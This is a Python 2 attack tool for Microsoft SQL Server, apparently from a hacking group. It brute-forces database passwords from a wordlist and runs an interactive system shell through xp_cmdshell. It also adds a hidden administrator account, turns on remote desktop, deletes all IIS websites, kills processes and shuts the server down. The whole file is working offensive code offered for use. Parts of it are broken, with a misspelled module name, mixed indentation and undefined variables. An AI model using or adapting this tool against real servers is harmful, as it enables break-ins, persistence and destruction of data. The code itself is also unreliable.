#!/usr/bin/python
# Author: [C]orrupted[B]yte
# (c)R00TW0RM - Private Community
# http://r00tw0rm.com/
# Greets: To all members of ROOTW0RM
import pymssql
import os
import time


def dbconnection(fn):
	def wrapper(dbHost, dbUser, dbPass):
	    try:
	        conn = pymsql.connect(host=dbHost, user=dbUser, password=dbPass)
	        cursor = conn.cursor()
	        fn(cursor)
	    except:
	        print 'Connection failure'
	        exit()
	    finally:
	        conn.close()
	return wrapper

def printcursor(cursor):
    while True:
        row = cursor.fetchone()
        if not row: break
        print row[0]

class MSSExploiter():
    #Simple dictionary attack
    @staticmethod
    def dictAttack(dictFile, dbHost, dbUser):
        i = 0
        try:
            f = open(dictFile, 'r')
            while True:
                i = i + 1
                line = f.readline()
                if not line: break
                dbPass = line.strip()
                if (i == 47):
                    print '[!]Unable to find the password try again'
                    break
                try:
                    conn = pymssql.connect(host=dbHost, user=dbUser, password=dbPass)
                    input('[!]Succesfull connection with password: ' +dbPass)
                    break
                except:
                    print 'Working...'
                    continue
        except:
            print '[!]Impossible to open dictionary'
            time.sleep(3)

    #Microsoft SQL Server Shell
    @staticmethod
    @dbconnection
    def mssShell(cur):
        cur.execute("exec master.dbo.xp_cmdshell 'hostname'")
        prompt = cur.fetchone()[0] + '~$ '
        while True:
            command = raw_input(prompt)
            if command == 'exit': break
            cur.execute("exec master.dbo.xp_cmdshell '%s'" % command)
            printcursor(cur)

    #Function for IIS manipulation
    @staticmethod
    @dbconnection
    def iisManipulation(cur):
        cmds = [
            ["Start iss", "exec master.dbo.xp_cmdshell 'iisreset /start'"],
            ["Stop iss", "exec master.dbo.xp_cmdshell 'iisreset /stop'"],
            ["Restart iss", "exec master.dbo.xp_cmdshell 'iisreset /restart'"],
            ["Check iss status", "exec master.dbo.xp_cmdshell 'iisreset /status'"]
        ]
        print '::.IIS Manipulation.::'
        for index, cmd in enumerate(cmds):
            print '%s.-%s' % (index, cmd)
        while True:
            op = raw_input('Choose an option: ')
            if op == 'exit': break
            try:
                command = cmds[int(op)]
                cur.execute(command[1])
                printcursor(cur)
            except:
                print 'Select a correct option...'

    #Delete all websites in IIS server
    @staticmethod
    @dbconnection
    def deleteWebsites(cur):
        cur.execute("exec master.dbo.xp_cmdshell 'rmdir /s /q C:\Inetpub\wwwroot\'")
        printcursor(cur)
        time.sleep(3)

    #Create admin user
    @staticmethod
    @dbconnection
    def createAdminUser(cur):
        adminUser = raw_input('Username: ')
        adminPass = raw_input('Password: ')
        cur.execute("exec master.dbo.xp_cmdshell 'net user %s %s /add'" % (adminUser, adminPass))
        cur.execute("exec master.dbo.xp_cmdshell 'net localgroup Administrators %s /add'" % adminUser)
        print '[!]User %s with password %s created successfully' % (adminUser, adminPass)
        time.sleep(3)

    #Enable remote desktop
    @staticmethod
    @dbconnection
    def enableDesktop(cur):
        enablingCmd = 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
        cur.execute("exec master.dbo.xp_cmdshell '%s'" % enablingCmd)
        printcursor(cur)

    #Disable remote desktop
    @staticmethod
    @dbconnection
    def disableDesktop(cur):
        disablingCmd = 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f'
        cur.execute("exec master.dbo.xp_cmdshell '%s'" % disablingCmd)
        printcursor(cur)

    #Remote desktop
    @staticmethod
    def remoteConn(dbHost):
        try:
            os.system("rdesktop %s" % dbHost)
        except:
            print 'unable to conect with host %s' %host

    #shutdown computer
    @staticmethod
    @dbconnection
    def shutDownPc(cur):
        try:
            cur.execute("exec master.dbo.xp_cmdshell 'shutdown /s /f'")
            print 'shutting down in 30 seconds...'
            time.sleep(5)
        except:
            print 'cannot shutdown the PC'
            time.sleep(3)

    #kill porcess
    @staticmethod
    @dbconnection
    def killProcess(cur):
        cur.execute("exec master.dbo.xp_cmdshell 'tasklist'")
        printcursor(cur)
        PID = raw_input('Introduce PID process to kill: ')
        cur.execute("exec master.dbo.xp_cmdshell 'taskkill /PID %s'" % PID)
        printcursor(cur)
        time.sleep(3)

    #SQL Manager
    @staticmethod
    @dbconnection
    def sqlManager(cur):
        print '::.SQL Manager.::'
        cur.execute('SELECT * FROM master.dbo.SysDatabases')
        printcursor(cur)
        dbName = raw_input('Choose a database: ')
        conn = pymssql.connect(host=dbHost, user=dbUser, password=dbPass, database=dbName)
        cur = conn.cursor()
        command = 'y'
        command = raw_input('SQL Manager~$ ')
        while command != 'exit':
            if command == 'SHOW TABLES':
                cur.execute("SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'")
                row = cur.fetchone()
                while row:
                    row = cur.fetchone()
                    if not row: break
                    print row[2]
            try:
                cur.execute('%s' % command)
                while row:
                    row = cur.fetchone()
                    if not row: break
                    print row
            except:
                print ''
            command = raw_input('SQL Manager~$ ')




class main():
    #Main function

    def printheader():
        print '___  ___ _____ _____   _____           _       _ _'
        print '|  \/  |/  ___/  ___| |  ___|         | |     (_) |'
        print '| .  . |\ `--.\ `--.  | |____  ___ __ | | ___  _| |_ ___ _ __'
        print '| |\/| | `--. \`--. \ |  __\ \/ / _  \| |/ _ \| | __/ _ \ __|'
        print '| |  | |/\__/ /\__/ / | |___>  <| |_) | | (_) | | ||  __/ |'
        print '\_|  |_/\____/\____/  \____/_/\_\ .__/|_|\___/|_|\__\___|_|'
        print '                                | |'
        print '                                |_|'
        print '(c)R00TW0RM Coders Team - Private Community'
        print '.::Coded by [C]orrupted[B]yte::.\n'

	def sqlMenu(host, user, password):
		os.system('clear')
        printheader()

		commands = [
	        ['Start microsoft shell', 'mssShell'],
	        ['Create user with administrative  permissions', 'createAdminUser'],
	        ['Enable remote desktop', 'enableDesktop'],
	        ['Disable remote desktop', 'disableDesktop'],
	        ['Connect with remote desktop', 'remoteConn'],
	        ['SQL Manager', 'sqlManager'],
	        ['Process killer', 'killProcess'],
	        ['Delete all websites', 'deleteWebsites'],
	        ['Stop/start/restart web server (IIS)', 'iisManipulation'],
	        ['Shutdown PC', 'shutDownPc']
		]

        for index, cmd in enumerate(commands):
            print '[%s] %s' % (index, cmd[0])

	    while True:
			op = raw_input('Choose an option (or exit): ')
			if op == 'exit': break
			f = MSSExploiter()
			try:
				method_name = commands[int(op)][1]
				method = getattr(f, method_name)
				method(host, user, password)
				sqlMenu()
			except:
				print "Try again"


    def mainMenu():
        printheader()
        print '[0]Enter SQL credentials'
        print '[1]Dictionary attack'

        while True:
            op = raw_input('Choose an option (or exit): ')
			if op == '0':
                os.system('clear')
                dbHost = raw_input('Introduce the ip host to connect: ')
                dbUser = raw_input('Introduce the DB user: ')
                dbPass = raw_input('Introduce the DB password: ')
                os.system('clear')
                printheader()
                sqlMenu(dbHost, dbUser, dbPass)
            elif op == '1':
                os.system('clear')
                f = MSSExploiter()
                dictFile = raw_input('Introduce the dictionary passwords name: ')
                dbUser = raw_input('Introduce user DB to try: ')
                dbHost =  raw_input('Introduce the ip host to attack: ')
                f.dictAttack(dictFile, dbHost, dbUser)
                os.system('clear')
                mainMenu()
            elif op == 'exit': break
            else: print 'Select a correct option...'
    os.system('clear')
    mainMenu()
